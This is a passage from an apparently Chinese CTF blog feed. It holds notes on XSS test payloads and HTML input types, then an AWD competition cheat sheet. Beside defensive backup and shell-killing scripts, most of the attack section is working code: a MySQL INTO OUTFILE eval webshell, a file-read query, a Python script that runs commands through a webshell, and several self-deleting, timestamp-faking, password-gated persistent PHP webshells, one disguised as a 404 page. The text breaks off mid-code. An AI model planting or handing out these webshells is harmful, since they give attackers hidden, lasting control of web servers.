type=&quot;hidden&quot;&gt;</code></p></blockquote><ul><li><code>&lt;input</code>&gt;Ê†áÁ≠æÔºöËøôÊòØHTML‰∏≠ÂàõÂª∫Ë°®ÂçïÂÖÉÁ¥†ÁöÑÊ†áÁ≠æ„ÄÇÈÄöËøá‰ΩøÁî®ËØ•Ê†áÁ≠æÔºåÂèØ‰ª•Âú®Ë°®Âçï‰∏≠Ê∑ªÂä†ÂêÑÁßçËæìÂÖ•Â≠óÊÆµÔºåÊØîÂ¶ÇÊñáÊú¨Ê°Ü„ÄÅÂ§çÈÄâÊ°Ü„ÄÅÂçïÈÄâÊåâÈíÆÁ≠â„ÄÇ</li><li><code>name=&quot;t_link&quot;</code>ÔºöËøôÊòØ<code>&lt;input&gt;</code>Ê†áÁ≠æÁöÑ‰∏Ä‰∏™Â±ûÊÄß„ÄÇÂÆÉÂÆö‰πâ‰∫ÜË°®ÂçïÂÖÉÁ¥†ÁöÑÂêçÁß∞ÔºåËøô‰∏™ÂêçÁß∞Âú®Êèê‰∫§Ë°®ÂçïÊó∂‰ºöË¢´Áî®‰ΩúÊï∞ÊçÆÁöÑÊ†áËØÜÁ¨¶„ÄÇÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåË°®ÂçïÂÖÉÁ¥†ÁöÑÂêçÁß∞ÊòØ‚Äùt_link‚Äù„ÄÇ</li><li><code>value=&quot;&#39;.&#39;&quot;</code>ÔºöËøôÊòØ<code>&lt;input&gt;</code>Ê†áÁ≠æÁöÑÂè¶‰∏Ä‰∏™Â±ûÊÄß„ÄÇÂÆÉÂÆö‰πâ‰∫ÜË°®ÂçïÂÖÉÁ¥†ÁöÑÂàùÂßãÂÄºÔºåÂç≥Âú®Áî®Êà∑Ê≤°ÊúâËæìÂÖ•‰ªª‰ΩïÂÄºÊó∂ÔºåÊèê‰∫§Ë°®ÂçïÊó∂‰ºö‰º†ÈÄíÁöÑÈªòËÆ§ÂÄº„ÄÇÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåË°®ÂçïÂÖÉÁ¥†ÁöÑÂàùÂßãÂÄºÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‚Äù<code>&#39;.&#39;</code>‚Äú„ÄÇ<br>-<code> type=&quot;hidden&quot;</code>ÔºöËøô‰πüÊòØ<code>&lt;input&gt;</code>Ê†áÁ≠æÁöÑ‰∏Ä‰∏™Â±ûÊÄß„ÄÇÂÆÉÂÆö‰πâ‰∫ÜË°®ÂçïÂÖÉÁ¥†ÁöÑÁ±ªÂûãÔºåËøôÈáåÊòØ‚Äùhidden‚ÄùÔºåË°®Á§∫ËøôÊòØ‰∏Ä‰∏™ÈöêËóèÁöÑËæìÂÖ•Â≠óÊÆµ„ÄÇÈöêËóèÂ≠óÊÆµ‰∏ç‰ºöÂú®È°µÈù¢‰∏äÊòæÁ§∫ÁªôÁî®Êà∑ÔºåËÄåÊòØÁî®‰∫éÂú®ÂêéÂè∞‰º†ÈÄíÊï∞ÊçÆ„ÄÇ</li></ul><blockquote><p><code>&lt;button onmouseover=&quot;alert(1)&quot;&gt;ÊÇ¨ÂÅúÂú®Êàë‰∏äÈù¢Â∞±‰ºöÂºπÁ™ó&lt;/button&gt;</code></p></blockquote><ul><li>Âú®Ëøô‰∏™Á§∫‰æã‰∏≠ÔºåÊúâ‰∏Ä‰∏™ÊåâÈíÆÂÖÉÁ¥†(<code>&lt;button&gt;</code>)ÔºåÂÆÉÂÖ∑Êúâ onmouseover Â±ûÊÄß„ÄÇËøôÊÑèÂë≥ÁùÄÂΩìÁî®Êà∑Â∞ÜÈº†Ê†áÊÇ¨ÂÅúÂú®ÊåâÈíÆ‰∏äÊó∂Ôºå‰ºöËß¶Âèë onmouseover ‰∫ã‰ª∂ÔºåÂπ∂ÊâßË°åÁõ∏Â∫îÁöÑ JavaScript ‰ª£Á†Å„ÄÇÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåÂΩìÁî®Êà∑ÊÇ¨ÂÅúÂú®ÊåâÈíÆ‰∏äÊó∂Ôºå‰ºöÂºπÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÊ°ÜÊòæÁ§∫Êï∞Â≠ó ‚Äú1‚Äù„ÄÇ</li></ul><blockquote><p><code>&lt;input accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;&gt;</code></p></blockquote><ul><li><p><code>accesskey=&quot;x&quot;</code>ÔºöËøôÊòØ‰∏Ä‰∏™ input ÂÖÉÁ¥†ÁöÑ accesskey Â±ûÊÄß„ÄÇÂÆÉÊåáÂÆö‰∫ÜÂú®È°µÈù¢‰∏äÈÄöËøáÈîÆÁõòÊøÄÊ¥ªËØ•ÂÖÉÁ¥†ÊâÄÈúÄË¶Å‰ΩøÁî®ÁöÑÂø´Êç∑ÈîÆ„ÄÇÂú®ËøôÈáåÔºåaccesskey&#x3D;‚Äùx‚Äù Ë°®Á§∫Áî®Êà∑ÂèØ‰ª•ÈÄöËøáÊåâ‰∏ã Alt (ÊàñÂú® macOS ‰∏ãÊòØ Control) ÈîÆ + ‚Äúx‚Äù ÈîÆÊù•ÊøÄÊ¥ªËØ•ËæìÂÖ•Â≠óÊÆµ„ÄÇ</p></li><li><p><code>onclick=&quot;alert(1)&quot;</code>ÔºöËøôÊòØ‰∏Ä‰∏™ input ÂÖÉÁ¥†ÁöÑ onclick Â±ûÊÄß„ÄÇÂÆÉÊåáÂÆö‰∫ÜÂΩìÁî®Êà∑ÁÇπÂáªÔºàÂçïÂáªÔºâËØ•ÂÖÉÁ¥†Êó∂Ë¶ÅÊâßË°åÁöÑ JavaScript ‰ª£Á†Å„ÄÇÂú®ËøôÈáåÔºåonclick&#x3D;‚Äùalert(1)‚Äù Ë°®Á§∫ÂΩìÁî®Êà∑ÁÇπÂáªËØ•ËæìÂÖ•Â≠óÊÆµÊó∂ÔºåÂ∞Ü‰ºöÂºπÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÊ°ÜÊòæÁ§∫Êï∞Â≠ó ‚Äú1‚Äù„ÄÇ</p></li><li><p><code>type=&quot;text&quot;</code>ÔºöËøôÊòØ‰∏Ä‰∏™ input ÂÖÉÁ¥†ÁöÑ type Â±ûÊÄß„ÄÇÂÆÉÂÆö‰πâ‰∫ÜËæìÂÖ•Â≠óÊÆµÁöÑÁ±ªÂûã„ÄÇÂú®ËøôÈáåÔºåtype&#x3D;‚Äùtext‚Äù Ë°®Á§∫ËøôÊòØ‰∏Ä‰∏™ÊñáÊú¨ËæìÂÖ•Â≠óÊÆµÔºåÁî®Êà∑ÂèØ‰ª•Âú®ËØ•ËæìÂÖ•Â≠óÊÆµ‰∏≠ËæìÂÖ•ÊñáÊú¨„ÄÇ</p></li></ul><p><strong>ÊãìÂ±ï‰∏Ä‰∏™</strong></p><ul><li><p>type&#x3D;‚Äùtext‚Äù: ÊñáÊú¨ËæìÂÖ•Â≠óÊÆµÔºåÁî®‰∫éÊé•Âèó‰ªªÊÑèÊñáÊú¨„ÄÇ</p></li><li><p>type&#x3D;‚Äùpassword‚Äù: ÂØÜÁ†ÅËæìÂÖ•Â≠óÊÆµÔºåÁî®‰∫éÊé•ÂèóÂØÜÁ†ÅÔºåËæìÂÖ•ÁöÑÂÜÖÂÆπ‰ºöË¢´ÈöêËóè„ÄÇ</p></li><li><p>type&#x3D;‚Äùnumber‚Äù: Êï∞Â≠óËæìÂÖ•Â≠óÊÆµÔºåÁî®‰∫éÊé•ÂèóÊï∞ÂÄºËæìÂÖ•ÔºåÂèØ‰ª•ÂåÖÂê´Êï∞Â≠óÂíåÁ¨¶Âè∑ÔºàÂ¶Ç+„ÄÅ-„ÄÅÂ∞èÊï∞ÁÇπÁ≠âÔºâ„ÄÇ</p></li><li><p>type&#x3D;‚Äùemail‚Äù: Áî®‰∫éÊé•ÂèóÁîµÂ≠êÈÇÆ‰ª∂Âú∞ÂùÄÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂèØ‰ª•È™åËØÅËæìÂÖ•ÂÜÖÂÆπÊòØÂê¶Á¨¶ÂêàÁîµÂ≠êÈÇÆ‰ª∂Âú∞ÂùÄÁöÑÊ†ºÂºè„ÄÇ</p></li><li><p>type&#x3D;‚Äùurl‚Äù: Áî®‰∫éÊé•ÂèóURLÂú∞ÂùÄÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂèØ‰ª•È™åËØÅËæìÂÖ•ÂÜÖÂÆπÊòØÂê¶Á¨¶ÂêàURLÁöÑÊ†ºÂºè„ÄÇ</p></li><li><p>type&#x3D;‚Äùtel‚Äù: Áî®‰∫éÊé•ÂèóÁîµËØùÂè∑Á†ÅÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂèØ‰ª•È™åËØÅËæìÂÖ•ÂÜÖÂÆπÊòØÂê¶Á¨¶ÂêàÁîµËØùÂè∑Á†ÅÁöÑÊ†ºÂºè„ÄÇ</p></li><li><p>type&#x3D;‚Äùdate‚Äù: Áî®‰∫éÊé•ÂèóÊó•ÊúüÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂèØ‰ª•ÈÄâÊã©Êó•Êúü„ÄÇ</p></li><li><p>type&#x3D;‚Äùtime‚Äù: Áî®‰∫éÊé•ÂèóÊó∂Èó¥ÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂèØ‰ª•ÈÄâÊã©Êó∂Èó¥„ÄÇ</p></li><li><p>type&#x3D;‚Äùcolor‚Äù: Áî®‰∫éÊé•ÂèóÈ¢úËâ≤ÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂèØ‰ª•ÈÄâÊã©È¢úËâ≤„ÄÇ</p></li><li><p>type&#x3D;‚Äùcheckbox‚Äù: Â§çÈÄâÊ°ÜÔºåÁî®‰∫éÈÄâÊã©‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÈÄâÈ°π„ÄÇ</p></li><li><p>type&#x3D;‚Äùradio‚Äù: ÂçïÈÄâÊåâÈíÆÔºåÁî®‰∫éÂú®‰∏ÄÁªÑÈÄâÈ°π‰∏≠ÈÄâÊã©‰∏Ä‰∏™„ÄÇ</p></li><li><p>type&#x3D;‚Äùfile‚Äù: Êñá‰ª∂‰∏ä‰º†Â≠óÊÆµÔºåÁî®‰∫éÈÄâÊã©‰∏ä‰º†Êñá‰ª∂„ÄÇ</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awdÊÄªÁªì</title>
      <link href="/2023/07/22/awd%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/22/awd%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Èò≤Âæ°"><a href="#Èò≤Âæ°" class="headerlink" title="Èò≤Âæ°"></a>Èò≤Âæ°</h2><h3 id="Â§á‰ªΩÊ∫êÁ†Å"><a href="#Â§á‰ªΩÊ∫êÁ†Å" class="headerlink" title="Â§á‰ªΩÊ∫êÁ†Å"></a>Â§á‰ªΩÊ∫êÁ†Å</h3><blockquote><p>ÂéãÁº©ÂëΩ‰ª§<br>tar -zcvf <a href="http://www.tar.gz/">www.tar.gz</a> &#x2F;var&#x2F;www&#x2F;*</p></blockquote><blockquote><p>Ëß£ÂéãÂëΩ‰ª§<br>tar -zxvf <a href="http://www.tar.gz/">www.tar.gz</a><br>ÊàñËÄÖ<br>tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;path&#x2F;web<br>tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;var&#x2F;www&#x2F;html</p></blockquote><h3 id="ÊâπÈáèÂä†waf"><a href="#ÊâπÈáèÂä†waf" class="headerlink" title="ÊâπÈáèÂä†waf"></a>ÊâπÈáèÂä†waf</h3><p># ÊâπÈáèÂä†waf &#x2F;var&#x2F;www&#x2F;html&#x2F; ÁõÆÂΩï‰∏ãÊØè‰∏™ php Êñá‰ª∂ÂâçÂä†‰∏ä <?php require_once "/tmp/waf.php";?></p><blockquote><p>find &#x2F;var&#x2F;www&#x2F;html&#x2F; -path &#x2F;var&#x2F;www&#x2F;html&#x2F;513666 -prune -o  -type f -name ‚Äò*.php‚Äô|xargs  sed -i ‚Äò1i<?php require_once "/tmp/waf.php";?>‚Äò</p></blockquote><h3 id="ÂÖãÂà∂‰∏çÊ≠ªÈ©¨"><a href="#ÂÖãÂà∂‰∏çÊ≠ªÈ©¨" class="headerlink" title="ÂÖãÂà∂‰∏çÊ≠ªÈ©¨"></a>ÂÖãÂà∂‰∏çÊ≠ªÈ©¨</h3><p>1.ps aux|grep shell.php ÊâæÂà∞pidÂêéÊùÄÊéâËøõÁ®ãÂ∞±ÂèØ‰ª•Ôºå‰Ω†Âà†ÊéâËÑöÊú¨ÊòØËµ∑‰∏ç‰∫Ü‰ΩúÁî®ÁöÑÔºåÂõ†‰∏∫phpÊâßË°åÁöÑÊó∂ÂÄôÂ∑≤ÁªèÊääËÑöÊú¨ËØªËøõÂéªËß£ÈáäÊàêopcodeËøêË°å‰∫Ü</p><p>2.ÈáçÂêØphpÁ≠âwebÊúçÂä°(rootÊùÉÈôê)</p><p>3.Áî®‰∏Ä‰∏™ignore_user_abort(true)ËÑöÊú¨Ôºå‰∏ÄÁõ¥Á´û‰∫âÂÜôÂÖ•ÔºàÊñ≠Êñ≠Áª≠Áª≠Ôºâ„ÄÇusleepË¶Å‰Ωé‰∫éÂØπÊñπ‰∏çÊ≠ªÈ©¨ËÆæÁΩÆÁöÑÂÄº„ÄÇ</p><p>4.ÂàõÂª∫‰∏Ä‰∏™Âíå‰∏çÊ≠ªÈ©¨ÁîüÊàêÁöÑÈ©¨‰∏ÄÊ†∑ÂêçÂ≠óÁöÑÊñá‰ª∂Â§π„ÄÇ</p><p>5.<code>pkill -u www-data</code></p><p>6.‰ΩøÁî®Êù°‰ª∂Á´û‰∫âÁöÑÊñπÂºèÔºå‰∏çÊñ≠Âæ™ÁéØÂàõÂª∫Âíå‰∏çÊ≠ªÈ©¨ÂêåÂêçÁöÑÊñá‰ª∂ÂíåÊñá‰ª∂Â§πÔºåÂú®Ê≠§Ê¨°ÊØîËµõ‰∏≠‰ΩøÁî®Ê≠§ÊñπÂºèÂÖãÂà∂<br> ‰∫Ü‰∏çÊ≠ªÈ©¨„ÄÇ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">dire</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php/"</span><span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php"</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token variable">$file</span><span class="token function">mkdir</span> <span class="token variable">$dire</span>./xx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Âà†Èô§ÊåáÂÆöÊñá‰ª∂"><a href="#Âà†Èô§ÊåáÂÆöÊñá‰ª∂" class="headerlink" title="Âà†Èô§ÊåáÂÆöÊñá‰ª∂"></a>Âà†Èô§ÊåáÂÆöÊñá‰ª∂</h3><blockquote><p>find &#x2F;var&#x2F;www&#x2F;html -name ‚Äú1.php‚Äù -delete</p></blockquote><h3 id="ShellÁõëÊéßÊñ∞Â¢ûÊñá‰ª∂"><a href="#ShellÁõëÊéßÊñ∞Â¢ûÊñá‰ª∂" class="headerlink" title="ShellÁõëÊéßÊñ∞Â¢ûÊñá‰ª∂"></a>ShellÁõëÊéßÊñ∞Â¢ûÊñá‰ª∂</h3><p>ÂàõÂª∫Êñá‰ª∂ÁöÑÊó∂ÂÄôÊõ¥ÊîπÊñá‰ª∂ÂàõÂª∫Êó∂Èó¥ÁÜüÊÇâÂèØËÉΩÁõëÊµã‰∏çÂà∞„ÄÇ</p><p>ËøêË°åÂëΩ‰ª§Ôºö<code>sh sh.sh</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token keyword">do</span>    <span class="token function">find</span> /app/ <span class="token parameter variable">-cmin</span> <span class="token parameter variable">-60</span> <span class="token parameter variable">-type</span> f <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span>    <span class="token function">sleep</span> <span class="token number">1</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ÊîªÂáª"><a href="#ÊîªÂáª" class="headerlink" title="ÊîªÂáª"></a>ÊîªÂáª</h2><h3 id="mysqlÂÜôÂÖ•Êú®È©¨"><a href="#mysqlÂÜôÂÖ•Êú®È©¨" class="headerlink" title="mysqlÂÜôÂÖ•Êú®È©¨"></a>mysqlÂÜôÂÖ•Êú®È©¨</h3><p><code>select &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;</code></p><h3 id="mysqlËØªÂèñÊñá‰ª∂"><a href="#mysqlËØªÂèñÊñá‰ª∂" class="headerlink" title="mysqlËØªÂèñÊñá‰ª∂"></a>mysqlËØªÂèñÊñá‰ª∂</h3><pre class="line-numbers language-none"><code class="language-none">select load_file(&quot;E:\\flag.txt&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-ÁÆÄÂçïÁöÑÊãøflagËÑöÊú¨-Âú®Êú¨Âú∞ÊâßË°å"><a href="#1-ÁÆÄÂçïÁöÑÊãøflagËÑöÊú¨-Âú®Êú¨Âú∞ÊâßË°å" class="headerlink" title="1.ÁÆÄÂçïÁöÑÊãøflagËÑöÊú¨(Âú®Êú¨Âú∞ÊâßË°å)"></a>1.ÁÆÄÂçïÁöÑÊãøflagËÑöÊú¨(Âú®Êú¨Âú∞ÊâßË°å)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://10a6eb1a-ee99-4562-8d4d-cefa0de4c770.challenge.ctf.show/1.php'</span><span class="token comment">#ËÆ∞ÂæóÊîπÊàêË¶ÅÊîªÂáªÁöÑip</span>payload<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'45'</span><span class="token punctuation">:</span><span class="token string">'system(\'cat flag.php\');'</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding<span class="token operator">=</span>r<span class="token punctuation">.</span>apparent_encoding<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•ÁªìÂêà‰∏äÈù¢‰∏ÄÂè•ËØùÊú®È©¨‰ΩøÁî®</p><p>Êàë‰ª¨Âè™Ë¶ÅÊääÂëΩ‰ª§ÊîπÊàêËØªÂèñflagÁöÑÂëΩ‰ª§ÔºåÊàë‰ª¨Â∞±ËÉΩ‰∏∫ÊâÄÊ¨≤‰∏∫‰∫Ü„ÄÇ</p><h3 id="2-ÈöêËóèÁâà‰∏çÊ≠ªÈ©¨Ôºà1Ôºâ"><a href="#2-ÈöêËóèÁâà‰∏çÊ≠ªÈ©¨Ôºà1Ôºâ" class="headerlink" title="2.ÈöêËóèÁâà‰∏çÊ≠ªÈ©¨Ôºà1Ôºâ"></a>2.ÈöêËóèÁâà‰∏çÊ≠ªÈ©¨Ôºà1Ôºâ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.git.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php @eval($_POST[\'ctf\']) ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" .git.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="‰∏çÊ≠ªÈ©¨2"><a href="#‰∏çÊ≠ªÈ©¨2" class="headerlink" title="‰∏çÊ≠ªÈ©¨2"></a>‰∏çÊ≠ªÈ©¨2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÂÖ≥ÊéâÊµèËßàÂô®ÔºåPHPËÑöÊú¨‰πüÂèØ‰ª•ÁªßÁª≠ÊâßË°å.</span>  <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÈÄöËøáset_time_limit(0)ÂèØ‰ª•ËÆ©Á®ãÂ∫èÊó†ÈôêÂà∂ÁöÑÊâßË°å‰∏ãÂéª</span>  <span class="token variable">$interval</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// ÊØèÈöî*ÁßíËøêË°å</span><span class="token keyword">do</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.123.php'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Â•ΩÂó®Ê≤πÔºÅÔºÅ"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".123.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["ctf"])=="2c3b3b52eb833ba66134aa1b3970b391")&#123;@eval($_POST[a]);&#125; ?>\n'</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$interval</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    2c3b3b52eb833ba66134aa1b3970b391Ëß£ÂØÜ‰∏∫ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="‰∏çÊ≠ªÈ©¨3"><a href="#‰∏çÊ≠ªÈ©¨3" class="headerlink" title="‰∏çÊ≠ªÈ©¨3"></a>‰∏çÊ≠ªÈ©¨3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.git.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["ctf"])=="2c3b3b52eb833ba66134aa1b3970b391")&#123;@eval($_POST[a]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>    2c3b3b52eb833ba66134aa1b3970b391Ëß£ÂØÜ‰∏∫ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="‰∏çÊ≠ªÈ©¨4Ôºà404Ôºâ"><a href="#‰∏çÊ≠ªÈ©¨4Ôºà404Ôºâ" class="headerlink" title="‰∏çÊ≠ªÈ©¨4Ôºà404Ôºâ"></a>‰∏çÊ≠ªÈ©¨4Ôºà404Ôºâ</h3><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php if(md5($_POST[&quot;ctf&quot;])&#x3D;&#x3D;&quot;2c3b3b52eb833ba66134aa1b3970b391&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;2c3b3b52eb833ba66134aa1b3970b391Ëß£ÂØÜ‰∏∫ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);ignore_user_abort(true);set_time_limit(0);#unlink(__FILE__);  &#x2F;&#x2F;Âà†Èô§Êñá‰ª∂Ëá™Ë∫´$paths&#x3D;&#96;find &#x2F;var&#x2F;www&#x2F;html -type d -writable&#96;;$paths&#x3D;explode(&quot;\n&quot;,$paths);array_pop($paths);$url &#x3D; $_REQUEST[&quot;url&quot;];$pass &#x3D; &quot;2c3b3b52eb833ba66134aa1b3970b391&quot;;$filename &#x3D; $_REQUEST[&quot;filename&quot;];echo &quot;&lt;!DOCTYPE HTML PUBLIC &#39;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&#39;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n&quot;;function self()&#123;    $self&#x3D;substr($_SERVER[&#39;PHP_SELF&#39;],strrpos($_SERVER[&#39;PHP_SELF&#39;],&#39;&#x2F;&#39;)+1);    return $self;  &#125;if($_REQUEST[&quot;m&quot;]&#x3D;&#x3D;&quot;czy&quot;)&#123;        if(md5($_REQUEST[&quot;pass&quot;]) &#x3D;&#x3D; $pass)&#123;            echo file_get_contents(&#39;.&#x2F;flag&#39;);            eval($_REQUEST[&#39;A&#39;]);        &#125;&#125;&#x2F;*if(&quot;1&quot;!&#x3D;&quot;2&quot;)&#123;        #while(1)&#123;        if(count($paths)!&#x3D;&#x3D;0)        &#123;                foreach 